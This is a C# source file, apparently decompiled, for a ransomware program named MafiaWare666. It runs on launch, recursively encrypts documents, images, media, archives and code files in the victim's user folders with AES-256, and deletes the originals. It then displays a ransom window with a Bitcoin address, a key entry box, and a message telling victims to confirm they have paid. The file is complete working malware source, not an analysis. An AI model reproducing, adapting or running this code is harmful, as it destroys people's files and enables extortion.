using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Plutus;

public class pluto : Form
{
	private List<string> filesToLock = new List<string>();

	private IContainer components = null;

	private PictureBox pictureBox1;

	private TextBox bitcoinAddr;

	private Label Description;

	private TextBox keyBox;

	private Button button1;

	public pluto()
	{
		string[] array = new string[34]
		{
			"*.docx", "*.pptx", "*.txt", "*.jpeg", "*.jpg", "*.png", "*.pdf", "*.mp3", "*.gif", "*.ppt",
			"*.zip", "*.bat", "*.py", "*.vb", "*.vbs", "*.bmp", "*.ps2", "*.jbig", "*.mp4", "*.mkv",
			"*.php", "*.avi", "*.rar", "*.wav", "*.xls", "*.xlsx", "*.htm", "*.html", "*.json", "*.html",
			"*.md", "*.cpp", "*.h", "*.MafiaWare666"
		};
		string[] array2 = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures)
		}.ToArray();
		for (int i = 0; i < array2.Length; i++)
		{
			string[] array3 = array;
			foreach (string searchPattern in array3)
			{
				try
				{
					string[] files = Directory.GetFiles(array2[i], searchPattern, SearchOption.AllDirectories);
					for (int k = 0; k < files.Length; k++)
					{
						if (files[k] != null)
						{
							if (files[k].Contains(".MafiaWare666"))
							{
								filesToLock.Add(files[k]);
								continue;
							}
							filesToLock.Add(files[k]);
							lockFiles(files[k], "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206");
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		filesToLock.ToArray();
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)keyBox).get_Text() == "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206")
		{
			MessageBox.Show("Key accepted, decrpytion will start now. \nJust sit tight, and relax");
			foreach (string item in filesToLock)
			{
				if (item.Contains(".MafiaWare666"))
				{
					unlockFile(item, "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206");
				}
			}
			MessageBox.Show("Decrypted enjoy your files \n                  \\(¬_¬)/ \n                      |_| \n                      / \\ ");
		}
		else
		{
			MessageBox.Show("That key was wrong, what to do? \n       - Make sure you've paid \n      - Make sure you've copied the key properly \n      - Contact us asking for help key \n      - Send us proof that you've paid and will send \n        functioning key or decryprion software");
		}
	}

	[DllImport("KERNEL32.DLL")]
	public static extern bool RtlZeroMemory(IntPtr Destitnation, int length);

	public static byte[] createSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void lockFiles(string inputFiles, string password)
	{
		byte[] array = createSalt();
		FileStream fileStream = new FileStream(inputFiles + ".MafiaWare666", FileMode.Append);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFiles, FileMode.Open);
		byte[] array2 = new byte[91048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			File.Delete(inputFiles);
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	private void unlockFile(string inputFiles, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFiles, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		string path = inputFiles.Replace(".MafiaWare666", "");
		FileStream fileStream2 = new FileStream(path, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			File.Delete(inputFiles);
			fileStream2.Close();
			fileStream.Close();
		}
	}

	private void pluto_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Expected O, but got Unknown
		//IL_022d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a0: Expected O, but got Unknown
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_033c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0346: Expected O, but got Unknown
		//IL_036a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0477: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(pluto));
		pictureBox1 = new PictureBox();
		bitcoinAddr = new TextBox();
		Description = new Label();
		keyBox = new TextBox();
		button1 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox1.set_ErrorImage((Image)componentResourceManager.GetObject("pictureBox1.ErrorImage"));
		pictureBox1.set_ImageLocation(".\\Plutus\\img\\hadesb.jpg");
		pictureBox1.set_InitialImage((Image)componentResourceManager.GetObject("pictureBox1.InitialImage"));
		((Control)pictureBox1).set_Location(new Point(9, 10));
		((Control)pictureBox1).set_Margin(new Padding(2, 2, 2, 2));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(194, 346));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)bitcoinAddr).set_BackColor(Color.Maroon);
		((Control)bitcoinAddr).set_Enabled(false);
		((Control)bitcoinAddr).set_Font(new Font("Tahoma", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)bitcoinAddr).set_ForeColor(Color.White);
		((Control)bitcoinAddr).set_Location(new Point(213, 322));
		((Control)bitcoinAddr).set_Margin(new Padding(2, 2, 2, 2));
		((TextBoxBase)bitcoinAddr).set_Multiline(true);
		((Control)bitcoinAddr).set_Name("bitcoinAddr");
		((Control)bitcoinAddr).set_Size(new Size(385, 35));
		((Control)bitcoinAddr).set_TabIndex(1);
		((Control)bitcoinAddr).set_Text("3NA2hxPUPGqTkvXsMXwhGKUpE5jqumMyYi");
		bitcoinAddr.set_TextAlign((HorizontalAlignment)2);
		((Control)Description).set_AutoSize(true);
		((Control)Description).set_Font(new Font("Microsoft Sans Serif", 11f));
		((Control)Description).set_Location(new Point(207, 10));
		((Control)Description).set_Margin(new Padding(2, 0, 2, 0));
		((Control)Description).set_Name("Description");
		((Control)Description).set_Size(new Size(417, 234));
		((Control)Description).set_TabIndex(2);
		((Control)Description).set_Text(componentResourceManager.GetString("Description.Text"));
		((Control)keyBox).set_Font(new Font("Microsoft YaHei", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)keyBox).set_Location(new Point(213, 284));
		((Control)keyBox).set_Margin(new Padding(2, 2, 2, 2));
		((TextBoxBase)keyBox).set_Multiline(true);
		((Control)keyBox).set_Name("keyBox");
		((Control)keyBox).set_Size(new Size(187, 35));
		((Control)keyBox).set_TabIndex(3);
		((Control)keyBox).set_Text("ENTER DECRYPTION KEY\r\n[The key gets trimmed]");
		keyBox.set_TextAlign((HorizontalAlignment)2);
		((Control)button1).set_Font(new Font("Microsoft YaHei", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(404, 284));
		((Control)button1).set_Margin(new Padding(2, 2, 2, 2));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(194, 34));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("DECRYPT ME!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Gold);
		((Form)this).set_ClientSize(new Size(609, 366));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)keyBox);
		((Control)this).get_Controls().Add((Control)(object)Description);
		((Control)this).get_Controls().Add((Control)(object)bitcoinAddr);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Margin(new Padding(2, 2, 2, 2));
		((Control)this).set_Name("pluto");
		((Control)this).set_Text("MafiaWare666");
		((Form)this).add_Load((EventHandler)pluto_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
